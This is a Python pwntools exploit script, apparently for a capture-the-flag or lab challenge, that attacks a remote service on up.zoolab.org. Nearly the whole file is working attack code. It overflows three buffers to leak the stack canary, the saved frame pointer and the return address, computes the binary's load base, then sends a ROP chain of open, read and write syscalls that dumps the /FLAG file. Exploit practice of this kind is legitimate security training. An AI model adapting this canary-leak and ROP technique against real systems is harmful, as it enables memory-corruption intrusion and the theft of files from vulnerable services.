from copy import deepcopy
from typing import Union
from pwn import remote 

# Number of bytes per machine word on x86-64
WORD_SIZE = 8

# Offsets to compute addresses inside the target binary
# (These values are derived from reverse-engineering the ELF layout)
RETURN_ADDR_TO_TEXT_BASE = 0x9C83

# Stack layout offsets within the `task` function’s frame:
RBP_TO_CANARY      = 0x08
RBP_TO_BUFFER1     = 0xC0
RBP_TO_BUFFER2     = 0x90  # buf1-0x30
RBP_TO_BUFFER3     = 0x60  # buf2-0x30
RBP_TO_MESSAGE_BUF = 0x30  # buf3-0x30

# Additional small offsets between saved registers on the stack:
RBP_TO_OLD_RBP     = 0x08
OLD_RBP_TO_RETADDR = 0x08  # saved RBP is 8 bytes above saved RIP

# A placeholder pattern (8 bytes of 0xFF) that we’ll overwrite later
PLACEHOLDER = b'\xFF' * WORD_SIZE

# Path to the flag file (we’ll embed this string in little-endian form)
FLAG_PATH_RAW = b"/FLAG"
FLAG_BUFFER_SIZE = 64  # bytes reserved for reading the flag

# Convert integers or raw byte strings into 8-byte little-endian chunks
def to_word_bytes(value: Union[int, bytes]) -> bytes:
    if isinstance(value, int):
        return value.to_bytes(WORD_SIZE, byteorder='little', signed=False)
    else:
        # If it's a bytes object shorter than 8 bytes, pad with nulls
        padding = (WORD_SIZE - (len(value) % WORD_SIZE)) % WORD_SIZE
        return value + b'\x00' * padding

# Given a list mixing integer offsets and byte sequences, build a contiguous ROP payload
def assemble_rop_chain(base_address: int, elements: list[Union[int, bytes]]) -> bytearray:
    payload = bytearray()
    for item in elements:
        if isinstance(item, int):
            addr = item + base_address
            payload.extend(to_word_bytes(addr))
        else:
            # Already a raw byte sequence (e.g., FLAG_PATH or zero buffer)
            payload.extend(to_word_bytes(item))
    return payload

# Replace every occurrence of PLACEHOLDER in `data` in 8-byte steps,
# filling them in order with the addresses supplied in `address_list`.
def patch_placeholders(data: bytearray, address_list: list[int]) -> bytearray:
    patched = deepcopy(data)
    idx = 0
    # Scan in 8-byte increments
    for offset in range(0, len(patched), WORD_SIZE):
        chunk = patched[offset : offset + WORD_SIZE]
        if chunk == PLACEHOLDER:
            # Overwrite the placeholder with the next real address
            patched[offset : offset + WORD_SIZE] = to_word_bytes(address_list[idx])
            idx += 1
    return patched

# ROP gadgets (relative offsets from the base of the loaded binary)
GADGET_POP_RDI = 0xBC33    # pop rdi; ret
GADGET_POP_RSI = 0xA7A8    # pop rsi; ret
GADGET_POP_RDX = 0x15F6E   # pop rdx; ret
GADGET_POP_RAX = 0x66287   # pop rax; ret
GADGET_SYSCALL= 0x30BA6    # syscall; ret

SHELLCODE_ASM = [
    # --- open("/FLAG", O_RDONLY) ---
    GADGET_POP_RDI,    # pop rdi; ret -> rdi = pointer to "/FLAG"
    PLACEHOLDER,       # Placeholder for flag_path_addr (will be patched later)
    GADGET_POP_RSI,    # pop rsi; ret -> rsi = 0 (O_RDONLY)
    b'\x00',           # 0x00 → O_RDONLY
    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_open (2)
    b'\x02',           # 0x02 (open syscall)
    GADGET_SYSCALL,    # syscall; ret

    # --- read(fd=3, buf, 64) ---
    GADGET_POP_RDI,    # pop rdi; ret -> rdi = file descriptor (assuming 3)
    b'\x03',           # 0x03
    GADGET_POP_RSI,    # pop rsi; ret -> rsi = buffer address
    PLACEHOLDER,       # Placeholder for flag_buffer_addr (will be patched later)
    GADGET_POP_RDX,    # pop rdx; ret -> rdx = 64
    to_word_bytes(FLAG_BUFFER_SIZE),
    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_read (0)
    b'\x00',           # 0x00 (read syscall)
    GADGET_SYSCALL,    # syscall; ret

    # --- write(fd=1, buf, 64) ---
    GADGET_POP_RDI,    # pop rdi; ret -> rdi = STDOUT (1)
    b'\x01',           # 0x01
    GADGET_POP_RSI,    # pop rsi; ret -> rsi = buffer address
    PLACEHOLDER,       # Placeholder for flag_buffer_addr (will be patched later)
    GADGET_POP_RDX,    # pop rdx; ret -> rdx = 64
    to_word_bytes(FLAG_BUFFER_SIZE),
    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_write (1)
    b'\x01',           # 0x01 (write syscall)
    GADGET_SYSCALL,    # syscall; ret

    # --- exit(0) ---
    GADGET_POP_RDI,    # pop rdi; ret -> rdi = 0
    b'\x00',           # 0x00
    GADGET_POP_RAX,    # pop rax; ret -> rax = SYS_exit (60)
    b'\x3C',           # 0x3C (exit syscall)
    GADGET_SYSCALL,    # syscall; ret

    # --- Data section: "/FLAG\0\0\0" + 64 bytes zeros ---
    to_word_bytes(FLAG_PATH_RAW),          # "/FLAG\x00\x00\x00"
    to_word_bytes(b'\x00' * FLAG_BUFFER_SIZE), # 64 bytes zero buffer
]

def exploit_target(conn: remote):
    # 1) Leak the stack canary by overflowing buffer1 up to the canary
    conn.recvuntil(b"What's your name? ")
    padding = b'A' * (RBP_TO_BUFFER1 - RBP_TO_CANARY)
    conn.sendline(padding)
    # The service echoes back including the canary (first byte is 0x00)
    leaked = conn.recvlinesb(2)[1]
    canary = b'\x00' + leaked[: WORD_SIZE - 1]
    canary_int = int.from_bytes(canary, byteorder='little')
    print(f"[+] Retrieved canary = 0x{canary_int:016x}")

    # 2) Leak the saved RBP by overflowing buffer2
    conn.recvuntil(b"What's the room number? ")
    overflow2 = b'B' * (RBP_TO_BUFFER2 - 1)
    conn.sendline(overflow2)
    leaked_rbp = conn.recvlinesb(2)[1][:WORD_SIZE]
    old_rbp = int.from_bytes(leaked_rbp, byteorder='little')
    print(f"[+] Retrieved old RBP = 0x{old_rbp:016x}")

    # 3) Leak the saved return address by overflowing buffer3
    conn.recvuntil(b"What's the customer's name? ")
    overflow3 = b'C' * (RBP_TO_BUFFER3 + RBP_TO_OLD_RBP - 1)
    conn.sendline(overflow3)
    leaked_ret = conn.recvlinesb(2)[1][:WORD_SIZE]
    saved_ret_addr = int.from_bytes(leaked_ret, byteorder='little')
    print(f"[+] Retrieved saved RIP = 0x{saved_ret_addr:016x}")

    # 4) Calculate the actual base of the binary in memory
    text_base = saved_ret_addr - RETURN_ADDR_TO_TEXT_BASE
    print(f"[+] Computed text base = 0x{text_base:016x}")

    # Determine where on the stack our ROP chain must begin
    rop_chain_start = old_rbp - OLD_RBP_TO_RETADDR
    print(f"[+] ROP chain start address = 0x{rop_chain_start:016x}")

    # Assemble the raw ROP bytes (with placeholders still intact)
    raw_chain = assemble_rop_chain(text_base, SHELLCODE_ASM)

    # Compute where the embedded "/FLAG" string and flag buffer will live
    new_rbp_value = rop_chain_start + len(raw_chain)
    # The flag buffer lives just before the new RBP value
    flag_buf_addr = new_rbp_value - FLAG_BUFFER_SIZE
    # The "/FLAG" string lives immediately before the flag buffer
    flag_path_addr = flag_buf_addr - len(to_word_bytes(FLAG_PATH_RAW))

    # Now replace each placeholder with the correct runtime address
    filled_chain = patch_placeholders(
        raw_chain,
        [flag_path_addr, flag_buf_addr, flag_buf_addr]
    )

    # 5) Build the final payload:  
    #    [ padding to reach canary ]  
    #    [ original canary ]  
    #    [ new RBP value ]  
    #    [ ROP chain with gadgets and data ]
    prefix = b'D' * (RBP_TO_MESSAGE_BUF - RBP_TO_CANARY)
    payload = prefix + canary + to_word_bytes(new_rbp_value) + filled_chain

    print(f"[+] Sending final payload ({len(payload)} bytes)...")
    conn.recvuntil(b"Leave your message: ")
    conn.sendline(payload)

    # Consume interim responses, then wait for the flag to appear (ends with "}")
    conn.recvlines(2)
    flag_output = conn.recvuntil(b"}").decode()
    print(f"[+] Flag: {flag_output}")

    conn.close()

if __name__ == "__main__":
    conn = remote("up.zoolab.org", 12344)
    exploit_target(conn)
